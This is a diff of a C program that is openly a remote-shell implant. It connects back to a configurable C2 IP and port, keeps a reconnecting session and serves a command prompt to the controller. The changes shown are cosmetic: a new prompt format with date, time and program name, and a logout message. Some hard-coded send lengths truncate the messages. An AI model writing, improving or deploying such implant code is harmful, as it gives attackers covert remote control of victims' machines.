@@ -2,6 +2,8 @@
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
+#include <libgen.h>
+#include <time.h>
 
 #ifdef _WIN32
     #include <winsock2.h>
@@ -29,14 +31,15 @@
     #include <signal.h>
     #include <fcntl.h>
     #include <sys/select.h>
-    #ifndef MSG_NOSIGNAL
-	#define MSG_NOSIGNAL 0 // macOS 不支持这个标志，所以设为0
+#ifndef MSG_NOSIGNAL
+    #define MSG_NOSIGNAL 0
+#endif
+
+#ifdef __APPLE__
+    #ifndef SO_NOSIGPIPE
+        #define SO_NOSIGPIPE 0x1022
     #endif
-    #ifdef __APPLE__
-	#ifndef SO_NOSIGPIPE
-	    #define SO_NOSIGPIPE 0x1022
-	#endif
-    #endif
+#endif
 #endif
 
 // 你可以根据需要修改 C2 的 IP 和端口
@@ -248,12 +251,23 @@ int main() {
 #endif
         }
         
-        send(s, "[*] 状态流模式已开启。已成功防断线，支持自动重连！\n", 48, 0);
+        send(s, "[+] 状态流模式已开启。已成功防断线，支持自动重连！\n", 48, 0);
 
         while (1) {
             getcwd(path, sizeof(path));
+
+            // 获取当前程序的文件名
+            const char* Program_name = basename(__argv[0]);
+
+            // 获取当前的日期和时间
+            time_t now = time(NULL);
+            struct tm* tm = localtime(&now);
+            char date_time[32];
+            strftime(date_time, sizeof(date_time), "%Y-%m-%d %H:%M:%S", tm);
+
+            // 构建提示符
             char prompt[600];
-            snprintf(prompt, sizeof(prompt), "\n[%s] shell-> ", path);
+            snprintf(prompt, sizeof(prompt), "\n-{%s}-{(%s)[%s]}-> ", date_time, Program_name, path);
             
             if (send(s, prompt, (int)strlen(prompt), 0) < 0) {
                 break; 
@@ -267,6 +281,7 @@ int main() {
             if (strlen(buf) == 0) continue;
             
             if (strcmp(buf, "exit") == 0) {
+                send(s, "[-] Logout\n", 8, 0);
 #ifdef _WIN32
                 closesocket(s); WSACleanup();
 #else
